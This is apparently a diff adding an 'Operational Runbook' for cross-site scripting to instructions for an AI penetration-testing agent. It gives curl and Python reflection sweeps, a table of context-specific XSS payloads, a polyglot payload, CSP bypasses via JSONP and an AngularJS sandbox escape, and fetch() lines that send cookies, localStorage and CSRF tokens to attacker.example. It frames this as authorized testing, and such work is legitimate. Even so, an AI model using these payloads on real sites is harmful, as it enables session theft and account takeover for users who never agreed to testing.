@@ -159,6 +159,132 @@ Keep a compact set tuned per context:
 - Persistence: service worker registration; localStorage/script gadget re-injection
 - Impact: role hijack, CSRF chaining, internal port scan via fetch, credential phishing overlays
 
+## Operational Runbook
+
+Once reflection / sink is confirmed, this is the canonical extraction flow. Avoid manual browser iteration — orchestrate through curl / python so the agent loop logs every probe.
+
+### Step 1 — find reflections fast with a single canary sweep
+
+```bash
+# Define one canary; spray every query/header/body param
+CANARY="STRIXxss$(date +%s)"
+for param in id q search user filter sort; do
+  curl -s "<TARGET>?${param}=${CANARY}" \
+    | grep -c "$CANARY" > "/tmp/xss_${param}.cnt"
+done
+# Any non-zero count → reflected; inspect context with the next step
+```
+
+For POST/JSON bodies, use `httpx`/`requests` in python:
+
+```python
+import httpx
+CANARY = "STRIXxss" + str(int(time.time()))
+for field in ["username", "comment", "title"]:
+    r = httpx.post("<TARGET>", json={field: CANARY, "_other": "x"})
+    if CANARY in r.text:
+        print(f"reflected: {field}")
+```
+
+### Step 2 — context probing (which encoding is in place?)
+
+```bash
+# Build a context probe payload that's safe for HTML body, attribute,
+# URL, and JS string contexts simultaneously
+CTX_PROBE='STRIX"\'</xss>'
+
+curl -s "<TARGET>?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote(input()))" <<< "$CTX_PROBE")" \
+  | tee /tmp/xss_ctx.html | grep -A1 -B1 'STRIX'
+```
+
+Inspect `/tmp/xss_ctx.html` for which characters survived:
+- `<` or `>` literal → HTML body context, executable JS via `<script>`/`<img>`
+- `"` survives + `<` encoded → attribute context, try `" onload=alert(1) "`
+- inside `<script>...var x = "..."</script>` → JS string context, escape with `\\"`
+- inside `href="..."` or `src="..."` → URL context, try `javascript:alert(1)`
+
+### Step 3 — context-appropriate payload library
+
+| Context | Minimal exec payload |
+|---|---|
+| HTML body | `<script>alert(1)</script>` |
+| HTML body (filtered `<script>`) | `<img src=x onerror=alert(1)>` |
+| HTML body (filtered `<img>`) | `<svg/onload=alert(1)>` |
+| Attribute (unquoted) | ` onload=alert(1) ` |
+| Attribute (double-quoted) | `" onload=alert(1) "` |
+| Attribute (single-quoted) | `' onload=alert(1) '` |
+| JS string | `";alert(1);//` or `\\';alert(1);//` |
+| URL (href/src) | `javascript:alert(1)` |
+| CSS context | `expression(alert(1))` (legacy IE) / `</style><script>alert(1)</script>` |
+| SVG context | `<g onload="alert(1)"/>` |
+
+### Step 4 — stored XSS confirmation via browser automation
+
+For stored XSS the canary-sweep approach above also works for *submission*, but proof-of-execution requires real DOM evaluation. Use `browser_action` (or playwright in python):
+
+```python
+from playwright.sync_api import sync_playwright
+
+with sync_playwright() as p:
+    browser = p.chromium.launch()
+    page = browser.new_page()
+    fired = []
+    page.on("dialog", lambda d: (fired.append(d.message), d.accept()))
+    page.goto("<TARGET_VIEW_URL>")
+    # Confirm `alert` fired
+    assert "STRIX" in (fired[0] if fired else "")
+    browser.close()
+```
+
+The `fired` list captures the alert message; presence of the canary in it is execution evidence (vs. simple reflection).
+
+### Step 5 — exfil PoC (post-exec, for impact narrative)
+
+Demonstrate impact without actually exfiltrating real session data — use a controlled OOB host:
+
+```javascript
+// Minimal PoC: pull document.cookie to attacker host
+fetch('https://attacker.example/x?c=' + encodeURIComponent(document.cookie))
+
+// localStorage exfil
+fetch('https://attacker.example/x?s=' + btoa(JSON.stringify(localStorage)))
+
+// CSRF token grab
+fetch('https://attacker.example/x?csrf=' + document.querySelector('meta[name=csrf-token]').content)
+```
+
+For the report, document the OOB destination as a benign collaborator (e.g. Burp Collaborator FQDN) — never use real attacker infrastructure during the engagement.
+
+### Step 6 — CSP bypass workflow (when target has restrictive CSP)
+
+```bash
+# 1. Extract CSP header
+curl -sI <TARGET> | grep -i content-security-policy
+
+# 2. Inspect allowed sources for misconfig:
+#    - 'unsafe-inline' → no bypass needed
+#    - 'self' + JSONP endpoint on same origin → use the JSONP callback
+#    - permissive script-src whitelisting CDN → host payload there
+#    - default-src 'self' with no 'script-src' → check style-src bypasses
+# 3. Build the bypass payload:
+
+# JSONP callback bypass example:
+# CSP allows scripts from self; same-origin /api/callback?cb=<NAME> exposes JSONP
+<script src="/api/callback?cb=alert(1)//"></script>
+
+# CDN whitelist bypass (angular):
+<script src="https://cdn.example/angularjs/1.5.9/angular.min.js"></script>
+<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
+```
+
+### Polyglot one-liner (when context is unknown)
+
+```
+jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e
+```
+
+Catches HTML body, attribute, URL, JS string, comment-inside-script, and CSS contexts in one payload. Use when probing unknown sinks; switch to a context-specific minimal payload for the final PoC.
+
 ## Testing Methodology
 
 1. **Identify sources** - URL/query/hash/referrer, postMessage, storage, WebSocket, server JSON
